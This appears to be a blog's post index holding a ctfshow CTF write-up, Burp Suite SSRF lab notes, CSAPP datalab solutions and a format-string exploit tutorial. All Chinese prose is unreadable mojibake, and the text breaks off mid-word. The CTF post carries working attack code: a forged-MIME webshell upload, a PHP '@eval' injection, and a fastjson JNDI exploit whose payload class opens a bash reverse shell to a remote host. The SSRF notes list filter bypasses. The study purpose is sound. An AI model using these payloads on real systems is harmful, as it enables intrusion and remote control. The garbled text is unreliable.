è¿™ä¸ªè¿‡æ»¤ç­‰äºæ²¡è¿‡æ»¤ï¼Œç›´æ¥ä¼ªé€ ä¸€ä¸‹å°±è¡Œ import requestsurl = &quot;https://i.am.ctfer.com/photo_upload.php&quot;files = { 'file': (&quot;1.php&quot;, open(&quot;../1.php&quot;, &quot;rb&quot;), &quot;image/jpeg&quot;),}resp = requests.post(url=url, files=files)print(resp.text) æ‹¿åˆ°shellåï¼Œç„äº†çœ¼wpï¼Œä¸æ˜¯åœ¨è¿™ä¸ªæœºå™¨ä¸Šææƒï¼Œå°±æ²¡å¾€ææƒç ”ç©¶äº† æƒ³åˆ°ä¹‹å‰çš„åå°ç™»å½•ï¼Œæˆ‘ä»¬ç¿»login.phpï¼Œå‘ç°äº†è´¦æˆ·å¯†ç ï¼Œç›´æ¥ç™»å½•ï¼Œä½†æ˜¯å¥½åƒæ²¡å•¥ç”¨ï¼Œä¸è¿‡ç»™çš„è´¦æˆ·æ˜¯ä¸ª163çš„ç½‘æ˜“é‚®ç®±ï¼Œå¯ä»¥å»ç™»ä¸€ä¸‹ å¯ä»¥ç¿»åˆ°ä¸€ç¯‡å…¥èŒé€šçŸ¥çš„é‚®ä»¶ï¼Œä½†æ˜¯è¢«åŠ å¯†äº†ï¼Œå°è¯•å¼±å£ä»¤ï¼Œå‘ç°æ˜¯123456 ç„¶åå°±åˆå¤šäº†ä¸¤ä¸ªç›®æ ‡ï¼Œè¿˜æœ‰ä¸€ä¸ªè´¦å· å…¶ä¸­ä¸€ä¸ªæ˜¯ä¸€ä¸ªå¼€æ”¾çš„vscodeæœåŠ¡ï¼Œå¯ä»¥ç›´æ¥é€šè¿‡terminalæ‹¿åˆ°rootï¼Œä½†æ˜¯ä¹Ÿæ²¡ç”¨ï¼Œè¯´æ˜é‡Œæœ‰è¯´flagä¸åœ¨è¿™ï¼Œåªèƒ½è€å¿ƒå®¡ä»£ç äº†ã€‚ æ³¨æ„åˆ°è¿™ä¸ª/c/t.php &lt;?phpdate_default_timezone_set(&quot;Asia/Shanghai&quot;);header('Content-type:text/json;charset=utf-8');error_reporting(E_ALL ^ E_NOTICE ^ E_WARNING);session_start();if ($_SESSION['log'] !== 'yes') { $result['result'] = 'notok'; $result['msg'] = 'è¯·ç™»å½•'; echo json_encode($result, true); session_write_close(); exit();}session_write_close();require_once './f.php';$type = $_GET['type'];$t = $_POST['title'];$c = urldecode($_POST['content']);$d = $_POST['dat'];$a = $_POST['tag'];$edits = $_POST['editn'];$zhiding = $_POST['ifzd'];$fstr = '';$result['result'] = 'ok';function valid_date($date) { /*æ—¥æœŸåˆ¤æ–­å‡½æ•°*/ if (preg_match(&quot;/^([0-9]{4})-([0-9]{2})-([0-9]{2})$/&quot;, $date, $parts)) { if (checkdate($parts[2], $parts[3], $parts[1])) return true; else return false; } else return false;}if ($type == 'submit') { if (!is_dir('./../p/')) { mkdir('./../p/'); } if (!file_exists('./../p/index.php')) { $strs = '&lt;?php $inn=0;$in=array();$tp=\\'\\';$tagi=array(); ?&gt;'; file_put_contents('./../p/index.php', $strs); } if ($edits == '' || $edits == 'undefined' || $edits == 'null') { /*æ–°å»ºæ–‡ç« */ if (!empty($t) &amp;&amp; !empty($d) &amp;&amp; !empty($c)) { if (empty($a)) { $a = 'æ—¥å¸¸'; } require './../p/index.php'; $datestr = substr($d, 0, 4) . &quot;-&quot; . substr($d, 4, 2) . &quot;-&quot; . substr($d, 6, 2); if (valid_date($datestr)) { $in[$inn] = $d; } else { $in[$inn] = date('Ymd'); } $tagi[$inn] = $a; if ($zhiding == 'yes') { $rtp = preg_replace(&quot;/\\t|,/&quot;, '', $tp); if (empty($rtp)) { $tp = $inn . ','; } else { $tp = $tp . $inn . ','; } } arsort($in); $inn = $inn + 1; file_put_contents('./../p/index.php', '&lt;?php $inn=' . $inn . ';$in=' . var_export($in, true) . ';$tp=\\'' . $tp . '\\';$tagi=' . var_export($tagi, true) . ';?&gt;'); if (valid_date($datestr)) { $fstr = '&lt;?php $ptitle=&quot;' . $t . '&quot;;$pcontent=\\'' . addslashes(htmlspecialchars($c)) . '\\';$pdat=&quot;' . $d . '&quot;;$tag=&quot;' . $a . '&quot;;$ptype=&quot;post&quot;;?&gt;'; } else { $fstr = '&lt;?php $ptitle=&quot;' . $t . '&quot;;$pcontent=\\'' . addslashes(htmlspecialchars($c)) . '\\';$pdat=&quot;' . $d . '&quot;;$tag=&quot;' . $a . '&quot;;$ptype=&quot;page&quot;;?&gt;'; } file_put_contents('./../p/' . ($inn - 1) . '.php', $fstr); changed(); $result['pid'] = ($inn - 1); } else { $result['result'] = 'notok'; $result['msg'] = 'é™¤äº†æ ‡ç­¾ï¼Œå…¶ä»–å†…å®¹ä¸å¾—ä¸ºç©º.';........ .... }} else { $result['result'] = 'notok'; $result['msg'] = 'è¯·æ±‚é”™è¯¯';}echo json_encode($result, JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES);?&gt; ä¸»è¦æ˜¯è¿™ä¸ªåœ°æ–¹ $fstr = '&lt;?php $ptitle=&quot;' . $t . '&quot;;$pcontent=\\'' . addslashes(htmlspecialchars($c)) . '\\';$pdat=&quot;' . $d . '&quot;;$tag=&quot;' . $a . '&quot;;$ptype=&quot;post&quot;;?&gt;';file_put_contents('./../p/' . ($inn - 1) . '.php', $fstr); è¿™é‡Œä»”ç»†ç‚¹å°±èƒ½å‘ç°ï¼Œå› ä¸º$tå¯æ§ï¼Œå¾ˆå®¹æ˜“å°±èƒ½å§å‰åé—­åˆè°ƒï¼Œä¼ å…¥æˆ‘ä»¬æƒ³æ‰§è¡Œçš„ä»£ç  &lt;?php$fstr = '';$t = &quot;\\&quot;;phpinfo();?&gt;&quot;;$c = &quot;%3d&quot;;$d = &quot;11&quot;;$a = 'tag';$fstr = '&lt;?php $ptitle=&quot;' . $t . '&quot;;$pcontent=\\'' . addslashes(htmlspecialchars($c)) . '\\';$pdat=&quot;' . $d . '&quot;;$tag=&quot;' . $a . '&quot;;$ptype=&quot;post&quot;;?&gt;';echo $fstr; ç”¨pythonä¸Šä¼ æ—¶è¦æ³¨æ„ï¼Œä»–è¿™é‡Œæ˜¯è¦éªŒè¯ç™»å½•çš„ï¼Œä¹Ÿå°±æ˜¯açš„è·¯ç”±ï¼Œä¸è¿‡é‚£æ˜¯ä¸ªé»˜è®¤å£ä»¤ï¼Œç”¨ä»–ç»™çš„admin:123456å°±èƒ½ç™»å½• &quot;&quot;&quot;@Author: C4ry7nk&quot;&quot;&quot;import requestsurl = &quot;https://blog.ctfer.com/c/t.php?type=submit&quot;header = { &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36&quot;}Cookie = { &quot;PHPSESSID&quot;: &quot;1db2d15b63fec63ed5ea11cd7e43b2e1&quot;,}data = { # &quot;title&quot;: &quot;\\&quot;;phpinfo();?&gt;&quot;, &quot;title&quot;: &quot;\\&quot;;@eval($_POST['x']);?&gt;&quot;, &quot;dat&quot;: &quot;dat&quot;, &quot;content&quot;: &quot;%3d&quot;,}resp = requests.post(url=url, data=data, headers=header, cookies=Cookie)print(resp.text) è·å¾—shellåï¼Œç»§ç»­ä¿¡æ¯æœé›†ï¼Œä½†æ˜¯è¿™ä¸ªshellï¼Œåº”è¯¥æ˜¯æœåŠ¡å™¨æœ‰å®šæ—¶ä»»åŠ¡ï¼Œä¼šå®šæ—¶æ¸…ç†åé—¨ğŸï¼Œæ‰€ä»¥éš”ä¸€ä¼šshellå°±æ–­äº†ã€‚ æ¢æµ‹è¿™é‡Œå°±æŒ‰wpçš„æ–¹æ³•æ¥å§ï¼Œå®é™…ç¯å¢ƒä¸­è¦æ˜¯ä¸èƒ½ä¸Šä¼ å·¥å…·ï¼Œä¹Ÿå¯ä»¥åˆ©ç”¨shellè„šæœ¬ï¼Œæˆ–è€…wpé‚£æ ·æ‰‹åŠ¨pingï¼Œé™¤äº†æœ¬æœº192.168.101.3è¿˜æœ‰ä¸ªå­˜æ´»çš„192.168.101.2 æ¼æ´ç‚¹å°±æ˜¯8090çš„fastjson &lt; 1.2.25çš„CVE-2017-18349ï¼Œç¯å¢ƒçœ‹ä¸Šå»åº”è¯¥å°±æ˜¯vulhubçš„é‚£ä¸ªé¶åœºç¯å¢ƒ é¦–å…ˆç”Ÿæˆæ¶æ„çš„class public class fast { static { try { Runtime rt = Runtime.getRuntime(); String[] commands = {&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;bash -i &gt;&amp; /dev/tcp/vps/2333 0&gt;&amp;1&quot;}; Process pc = rt.exec(commands); pc.waitFor(); } catch (Exception e) { // do nothing } }} ç¼–è¯‘æˆclassæ–‡ä»¶ï¼Œpythonèµ·ä¸€ä¸ªhttpæœåŠ¡ åˆ©ç”¨marshalsecå¯åŠ¨jdniçš„ç›‘å¬ java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer &quot;http://43.143.156.226/#fast&quot; 22222 å†æä¸€ä¸ªjsonæ–‡ä»¶ï¼Œç”¨curlå‘èµ·è¯·æ±‚ { &quot;a&quot;:{ &quot;@type&quot;:&quot;java.lang.Class&quot;, &quot;val&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot; }, &quot;b&quot;:{ &quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;, &quot;dataSourceName&quot;:&quot;rmi://vps:22222/Exploit&quot;, &quot;autoCommit&quot;:true }} curl -X POST -H 'content-type:application/json' http://192.168.102.2:8090/ -d @x.json æ€»ç»“æŒºæœ‰æ„æ€çš„ï¼Œå‡ºé¢˜äººä¹ŸèŠ±äº†å¿ƒæ€çš„ï¼Œç›¸è¾ƒäºå¹³å¸¸CTFæ¥è¯´ç¡®å®è´´è¿‘å®æˆ˜ï¼Œç¬¬ä¸€æœŸçš„æ—¶å€™å¯æƒœåœ¨è€ƒè¯•ï¼Œæ²¡æ¥å¾—åŠå¤ç°","link":"/2023/03/13/ctfshowst02/"},{"title":"Burpsuite---SSRFä¸“é¢˜","text":"æœåŠ¡ç«¯è¯·æ±‚ä¼ªé€  Lab: Basic SSRF against the local serveråœ¨è¿™ä¸ªå®éªŒï¼Œæˆ‘ä»¬ä¸èƒ½ç›´æ¥è®¿é—®/adminçš„é¡µé¢ï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥æ‰¾åˆ°stockApiå‘èµ·çš„è¯·æ±‚ï¼Œäºæ˜¯æˆ‘ä»¬å°±å¯ä»¥å¯¹å…¶è¿›è¡Œä¿®æ”¹ï¼Œä¼ªé€ æˆç”±æˆ‘ä»¬æœ¬åœ°å‘èµ·çš„è¯·æ±‚ è¾¾åˆ°åˆ é™¤ç”¨æˆ·çš„ç›®çš„ Lab: Basic SSRF against another back-end systemé’ˆå¯¹åç«¯çš„ç³»ç»Ÿç”¨æˆ·æ— æ³•å»ç›´æ¥è®¿é—®ï¼Œä½†æ˜¯æœåŠ¡å™¨å¯ä»¥å‘èµ·è¯·æ±‚ï¼Œäºæ˜¯æˆ‘ä»¬ä¾ç„¶å¯ä»¥åˆ©ç”¨ssrfæ‰“ ç”¨intruderæ¨¡å—çˆ†ç ´1-255ç½‘æ®µ Lab: SSRF with blacklist-based input filterè‹¥æ˜¯æœ‰é»‘åå•è¿‡æ»¤ï¼Œä¸€äº›åº”ç”¨ç¨‹åºä¼šé˜»æ­¢åŒ…å«è¯¸å¦‚127.0.0.1ä¹‹ç±»çš„ä¸»æœºålocalhostæˆ–è¯¸å¦‚/adminï¼Œæˆ‘ä»¬å¯ä»¥è€ƒè™‘ä»¥ä¸‹ä¸€äº›æ–¹æ³•è¿›è¡Œç»•è¿‡ å°†127.0.0.1ç”¨2130706433, 017700000001, or 127.1æ¥ä»£æ›¿ ä½¿ç”¨åŒurlç¼–ç æˆ–è€…å¤§å°å†™æ··å†™ç»•è¿‡ å¯ä»¥ç”¨spoofed.burpcollaborator.netæ¥è§£ææˆ127.0.0.1 Lab: SSRF with whitelist-based input filteråŸºäºç™½åå•çš„ç»•è¿‡ å…ˆç”¨ä¸€ä¸ª@å­—ç¬¦æ¥åˆ¤æ–­urlæ˜¯å¦æ”¯æŒåµŒå…¥è§£æ http://baidu.com@emion.funä¾‹å¦‚è¿™æ ·ï¼Œå°±ä¼šè§£æ@åé¢çš„ç½‘ç«™ ç„¶åç”¨#å·å»æŒ‡å®šurlç‰‡æ®µ http://127.0.0.1%2523@stock.weliketoshop.net/admin/delete?username=carlos æ³¨æ„è¦è¿›è¡ŒåŒurlç¼–ç  è¾¾åˆ°bypassç™½åå•çš„è¿‡ç¨‹ Lab: SSRF with filter bypass via open redirection vulnerabilityå¦‚æœç¨‹åºä¸­åŒ…å«äº†é‡å®šå‘çš„æ¼æ´ï¼Œå°±å¯ä»¥ç»•è¿‡åŸºäºSSRFçš„è¿‡æ»¤ï¼Œç›´æ¥å°†è¯·æ±‚é‡å®šå‘åˆ°åç«¯ç›®æ ‡ä¸Š ç›²æ‰“çš„SSRFåŒsqlæ³¨å…¥ä¸€æ ·ï¼Œä¹Ÿå¯ä»¥é‡‡ç”¨OASTæŠ€æœ¯å°†æ•°æ®å¤–å¸¦å‡ºæ¥ è¿™ä¸ªå®éªŒè¿˜è¦é…åˆä¸€ä¸ªshellshockçš„æ¼æ´CVE-2014-6271 ï¼ˆè¿™é‡Œè²Œä¼¼åªèƒ½æ‰§è¡Œwoamiè¿™ä¸ªå‘½ä»¤ï¼Œå…¶ä»–çš„å¸¦ä¸å‡ºæ¥ã€‚ã€‚ã€‚","link":"/2022/03/12/burp_ssrf/"},{"title":"CSAPPä¹‹Data","text":"[TOC] 1.bitXoræ ¹æ®ä¹¦ä¸Šç»ƒä¹ é¢˜ä¸Šçš„^æ“ä½œ xor(a,b) =~a&amp;b | a&amp;~b ä»¥åŠå¾·æ‘©æ ¹å®šå¾‹ $$Â¬(Pâˆ¨Q)âŸº(Â¬P)âˆ§(Â¬Q)$$ xor(a,b)= ~a&amp;b|a&amp;~b = ~(~(~a&amp;b|a&amp;~b)) = ~(~(~a&amp;b)&amp;~(a&amp;~b)) æ‰€ä»¥ int bitXor(int x, int y) { return ~(~(~x&amp;y)&amp;~(x&amp;~y));} 2.tminè¿”å›è¡¥ç æœ€å°å€¼ï¼Œä¸”é¢˜ç›®ç¯å¢ƒä¸º32ä½ è®¡ç®—0x80000000 int tmin(void) { //-214783648 //-2^(32-1) return 1 &lt;&lt; 31;} 3.isTmaxåˆ¤æ–­æ˜¯å¦ä¸ºè¡¥ç æœ€å¤§å€¼ï¼Œæ˜¯è¿”å›1ï¼Œä¸æ˜¯è¿”å›0 0111 1111 1111 1111 1111 1111 1111 1111 # äºŒè¿›åˆ¶7 f f f f f f f # åå…­è¿›åˆ¶ tmin + tmax + 1 = 0;ç”±é¢˜æ„x = 011111111x+1 = 100000000~(x+1) = 0111111111x ^ ~(x+1) == 0 ? 1 : 0;æ’é™¤ç‰¹ä¾‹x = 11111111111...x + 1 = 000000000...~(x+1) = 11111111111...åˆ©ç”¨ !!~x == 0 int isTmax(int x) { //2^31-1 return (!(x ^ ~(x+1))) &amp; (!!~x);} 4.allOddBits4ä½ -&gt; 1010 -&gt; 0xA(num &amp; 0xA) ^ 0xA !=0 -&gt; numä¸ç­‰äº0xAæ„é€ 32ä½çš„maskAA = A | (A &lt;&lt; 4);AAAA = AA | (AA &lt;&lt; 8);mask = AAAA | (AAAA &lt;&lt; 16); wpå¦‚ä¸‹ int allOddBits(int x) { int A = 0xA; int AA = A | (A &lt;&lt; 4); //8ä½ int AAAA = AA | (AA &lt;&lt; 8); //16ä½ int mask = AAAA | (AAAA &lt;&lt; 16); //32ä½ return !((x &amp; mask) ^ mask);} 5.negateæ­£æ•°å–ååŠ 1ï¼Œæ­£å¥½å˜æˆå…¶å¯¹åº”çš„è´Ÿæ•°(è¡¥ç è¡¨ç¤º)ï¼›è´Ÿæ•°å–ååŠ ä¸€ï¼Œåˆ™å˜ä¸ºå…¶åŸç ï¼Œå³æ­£æ•° /* negate - return -x * Example: negate(1) = -1. * Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt; * Max ops: 5 * Rating: 2 */int negate(int x) { return ~x + 1;} 6.isAsciiDigit0x30 -&gt; 1100000x39 -&gt; 111001 åˆ¤æ–­//(x - 0x30 &gt;= 0) &amp;&amp; (0x39 - x &gt;= 0)åˆ©ç”¨ä¸Šé¢çš„å–åæ“ä½œï¼Œ+å˜-è¿ç®—åˆ©ç”¨mask = 1 &lt;&lt; 31; // 0x80000000maskå’Œä¸Šé¢çš„è¡¨è¾¾å¼åš&amp;è¿ç®—ï¼Œå–ç¬¦å·ä½åˆ¤æ–­æ­£è´Ÿï¼Œ int isAsciiDigit(int x) { //(x - 0x30 &gt;= 0) &amp;&amp; (0x39 - x &gt;= 0) int mask = 1 &lt;&lt; 31; return !((x+(~0x30 + 1)) &amp; mask) &amp; !((0x39 + (~x + 1)) &amp; mask);} 7.conditionalé¦–å…ˆå°†xçš„boolå€¼è½¬æ¢æ©ç ï¼Œä¸ºå…¨0æˆ–è€…å…¨1 int mask = ~!!x + 1;è‹¥xä¸ºé0ï¼Œmaskä¸º-1ï¼Œä½ä¸ºå…¨1ï¼Œmask&amp;yè¿”å›yï¼Œ~mask&amp;zè¿”å›0 int conditional(int x, int y, int z) { int mask = !!x; mask = ~mask + 1; return (mask &amp; y) | (~mask &amp; z);} 8.isLessOrEqualåˆ†æƒ…å†µè®¨è®º1.x == yint cond1 = !(x^y);2.ç¬¦å·ç›¸åå…ˆå–å‡ºç¬¦å·ä½åˆ¤æ–­int signX = x &gt;&gt; 31 &amp; 1;int signY = y &gt;&gt; 31 &amp; 1;fir. x- y+int cond2 = signX &amp; (!signY);//1sec. x+ y-int cond3 = (!signX) &amp; signY;//13.ç¬¦å·ç›¸åŒint mask = 1 &lt;&lt; 31;int cond4 = ((x + (~y+1)) &amp; mask);//1 è¿™ä¸ªæ„Ÿè§‰æœ‰ç‚¹å•°å—¦äº†ã€‚ã€‚ä½†æ˜¯å¯ä»¥ç†è§£ä¸€ä¸‹ è¿™ä¸ªé¢˜æ”¹äº†åŠå¤©ï¼Œä¸ªäººæ„Ÿè§‰ä¸‹é¢çš„åšæ³•æ›´å¥½ç†è§£ä¸€ç‚¹ã€‚ã€‚ int isLessOrEqual(int x, int y) { //æ±‚ä¸ªå·®å€¼ int sub = y + (~x + 1); //æ±‚ä¸ªå·®ç¬¦å·ä½,è´Ÿæ•°ä¸º1 int mask = 1 &lt;&lt; 31;//0x80000000 int flag = (sub &amp; mask) &gt;&gt; 31; //æ±‚ä¸¤æ•°çš„ç¬¦å·ä½ int signX = (x &gt;&gt; 31); int signY = (y &gt;&gt; 31); //ç¬¦å·ç›¸åŒè¿”å›0ï¼Œç¬¦å·ä¸åŒè¿”å›1 int cmp = ((signY ^ signX) &gt;&gt; 31) &amp; 1; //1.è‹¥ç¬¦å·ç›¸åŒ,åˆ™ç¬¦å·ä½åº”è¯¥ä¸º0 //2.è‹¥ç¬¦å·ä¸åŒï¼ŒsignXåº”ä¸º1 return (!cmp &amp; !flag) | (cmp &amp; signX);} 9.logicalNeg* logicalNeg - implement the ! operator, using all of the legal operators except !* Examples: logicalNeg(3) = 0, logicalNeg(0) = 1 æˆ‘ä»¬å¯ä»¥å°†é¢˜æ„ç†è§£ä¸º if(x!=0)return 0;elsereturn 1; äºæ˜¯æˆ‘ä»¬å°±è¯¥æƒ³æ€ä¹ˆåˆ¤æ–­x!=0; tryï¼šint a = 0101;int -a = 1011;int sign = 1 wpå¦‚ä¸‹ int logicalNeg(int x) { int negX = ~x + 1; int sign = (negX | x) &gt;&gt; 31; return sign + 1;} 10.howMantBitsè¿™ä¸€é¢˜æ€ä¹ˆè¯´ã€‚ã€‚é¢˜ç›®æ²¡çœ‹æ‡‚ï¼Œå‰å‰ååä¹ŸèŠ±äº†å¥½ä¹…ç†è§£é¢˜æ„å’Œwpï¼Œ /* howManyBits - return the minimum number of bits required to represent x in * two's complement * Examples: howManyBits(12) = 5 * howManyBits(298) = 10 * howManyBits(-5) = 4 * howManyBits(0) = 1 * howManyBits(-1) = 1 * howManyBits(0x80000000) = 32 * Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt; * Max ops: 90 * Rating: 4 */int howManyBits(int x) { //é€šè¿‡è¿™ä¸¤æ­¥ï¼Œè‹¥xä¸º0å°±è¿”å›1ä½ï¼Œæ˜¯æ­£æ•°å°±ä¿ç•™ï¼Œæ˜¯è´Ÿæ•°å°±æŒ‰ä½å–åï¼Œè¿™æ ·åŒæ—¶å»æ‰äº†ç¬¦å·ä½1ï¼Œæ‰¾åˆ°é¦–ä½0 int flag = x &gt;&gt; 31; x = (flag &amp; (~x)) | ((~flag) &amp; x); int b16, b8, b4, b2 ,b1, b0; b16 = (!!(x &gt;&gt; 16)) &lt;&lt; 4;//16 x &gt;&gt;= b16; b8 = (!!(x &gt;&gt; 8)) &lt;&lt; 3;//8 x &gt;&gt;= b8; b4 = (!!(x &gt;&gt; 4)) &lt;&lt; 2;//4 x &gt;&gt;= b4; b2 = (!!(x &gt;&gt; 2)) &lt;&lt; 1;//2 x &gt;&gt;= b2; b1 = (!!(x &gt;&gt; 1)); x &gt;&gt;= b1; b0 = x; int result = b0 + b1 + b2 + b4 + b8 + b16 + 1; return result;} ä¸‹é¢å°±æ˜¯ä¸€ç§å¯»æ‰¾é«˜ä½çš„äºŒåˆ†æ³•ï¼Œæœ€åå†åŠ ä¸Šç¬¦å·ä½ä¸€ä¸ª1ã€‚ https://binac.io/posts/csapp-data-lab/#fn:3 11.floatScale2unsigned floatScale2(unsigned uf) { //exp, sign, frac unsigned sign = (uf &gt;&gt; 31) &amp; 1; unsigned exp = (uf &gt;&gt; 23) &amp; 0xFF;//0xF=1111 è¡¨ç¤º4ä½ unsigned frac = uf &amp; 0x7FFFFF; //0 if(exp == 0 &amp;&amp; frac == 0) { return uf; } //infinity or NaN if(exp == 0xFF) { return uf; } //denormalize if(exp == 0) { //E = exp -127; frac &lt;&lt;= 1; return (sign &lt;&lt; 31) | frac; } //normalize exp++; //E = exp -127; return (sign &lt;&lt; 31) | (exp &lt;&lt; 23) | frac;} è¿™é¢˜çœ‹çœ‹ä¹¦çš„IEEEæµ®ç‚¹æ•°è¡¨ç¤ºï¼Œåœ¨è¿›è¡Œåˆ†ç±»è®¨è®º 12.floatFloat2Intè¿™ä¸ªå°±ç›´æ¥å†™æ³¨é‡Šé‡Œäº† int floatFloat2Int(unsigned uf) { //exp, sign, frac unsigned sign = (uf &gt;&gt; 31) &amp; 1; unsigned exp = (uf &gt;&gt; 23) &amp; 0xFF;//0xF=1111 è¡¨ç¤º4ä½ unsigned frac = uf &amp; 0x7FFFFF; //0 if(exp == 0 &amp;&amp; frac == 0) { return 0; } //infinity or NaN if(exp == 0xFF) { return 0x80000000; } //denormalize if(exp == 0) { //M 0.11111(2) å¾ˆå° //E = 1 - 127 = -126(åŸä¹¦ä¸Šçš„ï¼Œå½“ä¸ºéè§„æ ¼åŒ–ï¼ŒE = 1 - Bias); return 0; } //normalize int E = exp - 127; frac = frac | (1 &lt;&lt; 23); //1&lt;= M &lt; 2; if(E &gt; 31) //1.xxxxx { return 0x80000000; } else if(E &lt; 0) { return 0; } if(E &gt;= 23) { frac &lt;&lt;= (E - 23); }else { frac &gt;&gt;= (23 - E); } if(sign) { return ~frac + 1; } else { return frac; } } 13.floatPower2unsigned floatPower2(int x) { if(x &lt; -149) { return 0; }else if(x &lt; -126) { int shift = 23 + (x + 126); return 1 &lt;&lt; shift; }else if(x &lt;= 127) { int exp = x + 127; return exp &lt;&lt; 23; }else if(x &gt; 127) { return 0xFF &lt;&lt; 23; } }è¦æŠŠtime_outæ”¹ä¸º20ã€‚ã€‚ã€‚ æ€»ç»“ï¼šå¤ªèœäº†ï¼Œæœ‰çš„é¢˜ç›®çœ‹ä¸æ‡‚ï¼Œä¹Ÿä¸ä¼šåšã€‚æ€ä¹ˆè¯´ï¼Œåªèƒ½æ…¢æ…¢å­¦ï¼Œæœ‰ç©ºå¤šå¤ä¹ ï¼Œæ¸©æ•…è€ŒçŸ¥æ–°ã€‚","link":"/2021/11/28/datalab/"},{"title":"æ ¼å¼åŒ–å­—ç¬¦ä¸²åœ¨bssæ®µçš„åˆ©ç”¨","text":"ç›¸æ¯”æ ¼å¼åŒ–å­—ç¬¦ä¸²åœ¨æ ˆä¸Šï¼Œè¿™ç§æƒ…å†µçš„åˆ©ç”¨è¦å¤æ‚å¾ˆå¤šï¼Œæ›´å¤šçš„æ˜¯è¦åˆ†æ­¥å»æ”¹å†™å¯¹åº”çš„å€¼ è¿™é‡Œä»¥HITCONâ€”Training lab9ä¸ºä¾‹ï¼Œè¿™æ˜¯ä¸€é“å¾ˆç»å…¸çš„é¢˜ç›® å‚è€ƒæ˜Ÿç›Ÿv1ctorå¸ˆå‚…è®²è§£ v1ctorå¸ˆå‚…åœ¨è§†é¢‘é‡Œçš„expï¼Œåœ¨æˆ‘è¿™æ‰“ä¸é€šï¼Œæˆ‘è¯•äº†ä¸‹ï¼Œåº”è¯¥æ˜¯å­—èŠ‚å†™å…¥çš„é—®é¢˜ï¼Œæœ‰åœ°æ–¹å¯èƒ½æ²¡æ”¹å®Œå…¨ã€‚ 23R3Få¸ˆå‚… æºç  #include &lt;stdio.h&gt;#include &lt;unistd.h&gt;#include &lt;string.h&gt;char buf[200] ;void do_fmt(){ while(1){ read(0,buf,200); if(!strncmp(buf,&quot;quit&quot;,4)) break; printf(buf); } return ;}void play(){ puts(&quot;=====================&quot;); puts(&quot; Magic echo Server&quot;); puts(&quot;=====================&quot;); do_fmt(); return;}int main(){ setvbuf(stdout,0,2,0); play(); return;} printf(buf)æœ‰æ˜æ˜¾çš„æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼Œå¹¶ä¸”ï¼Œä»æºç é‡Œå°±å¯ä»¥çœ‹åˆ°bufæ˜¯å­˜åœ¨bssæ®µè€Œä¸æ˜¯æ ˆä¸Š gdbè°ƒè¯•ï¼Œæ–­ç‚¹ä¸‹åœ¨printfä¸Š æ ¹æ®ä¸Šé¢ä¸¤ä½å¸ˆå‚…çš„è®²è§£æˆ‘ä»¬çŸ¥é“èƒ½å¤Ÿåˆ©ç”¨æŠŠæ¼æ´åˆ©ç”¨ä¸²èµ·æ¥ï¼Œä»bssæ®µæ”¹åˆ°æ ˆä¸Šçš„è·³æ¿ï¼Œå°±ä¸‹é¢å››æ¡ï¼Œåç§»ä¸º6ï¼Œ7ï¼Œ10ï¼Œ11. 06:0018â”‚ ebp 0xffffd458 â€”â–¸ 0xffffd468 â€”â–¸ 0xffffd478 â—‚â€” 0x0 //è¿™ä¸ª07:001câ”‚ 0xffffd45c â€”â–¸ 0x8048584 (play+59) â—‚â€” nop //è¿™ä¸ª08:0020â”‚ 0xffffd460 â€”â–¸ 0xf7fbdd80 (_IO_2_1_stdout_) â—‚â€” 0xfbad288709:0024â”‚ 0xffffd464 â—‚â€” 0x00a:0028â”‚ 0xffffd468 â€”â–¸ 0xffffd478 â—‚â€” 0x0//è¿™ä¸ª0b:002câ”‚ 0xffffd46c â€”â–¸ 0x80485b1 (main+42) â—‚â€” nop //è¿™ä¸ª Step 1é¦–å…ˆå…ˆåˆ©ç”¨æ¼æ´æ³„æ¼åœ°å€ï¼ŒæŠŠä¸Šé¢å››æ¡è¦ç”¨çš„éƒ½æ‰¾å‡ºæ¥ payload paylaod = 'aaaa%6$p'sl(paylaod)ru(&quot;aaaa&quot;)ebp_content = int(rv(10), 16)ebp_base = ebp_content - 0x10step1 = ebp_content - 0xcstep2 = ebp_content + 0x4ms(&quot;ebp_content&quot;, ebp_content)ms(&quot;ebp_base&quot;, ebp_base)ms(&quot;ebp_content-0xc&quot;, step1)ms(&quot;main_offset&quot;, step2) Step 2æ¥ä¸‹æ¥å…ˆæŠŠåç§»6ï¼Œ7ä¸²èµ·æ¥ï¼Œå˜æˆä¸‹é¢è¿™æ · æ¥ç€å°±å¯ä»¥å°†playçš„ä½ä¸¤ä½æ”¹æˆprint_got payload payload1 = &quot;%&quot; + str(step1 &amp; 0xffff) + &quot;c%6$hn&quot;sl(payload1)#raw_input('&gt;')rc()payload2 = &quot;%&quot; + str(printf_got &amp; 0xffff) + &quot;c%10$hn&quot;sl(payload2)rc()while 1: sd(&quot;lnk&quot;) sleep(0.1) data = rc() if data.find(&quot;lnk&quot;) != -1: break#raw_input('&gt;') Step 3æˆ‘ä»¬çš„ç›®çš„æ˜¯ è®¡ç®—å‡ºsystemå‡½æ•°çš„åœ°å€ ,å°†systemå‡½æ•°åœ°å€å†™å…¥printfåœ¨gotè¡¨çš„åœ°å€ æ‰€ä»¥æˆ‘ä»¬å…ˆè¦æ³„æ¼å‡ºsystemçš„åœ°å€ï¼Œæ— æ³•ç›´æ¥æ³„æ¼ï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥å…ˆåˆ©ç”¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´æ³„æ¼printfçš„åœ°å€ï¼Œç„¶åé€šè¿‡åç§»è®¡ç®—system payload leak_printf = 'aaaa%7$s'sl(leak_printf)ru(&quot;aaaa&quot;)printf_addr = u32(rv(4))ms(&quot;printf_addr&quot;, printf_addr)system_addr = printf_addr - printf_off + system_libcms(&quot;system&quot;, system_addr) Step 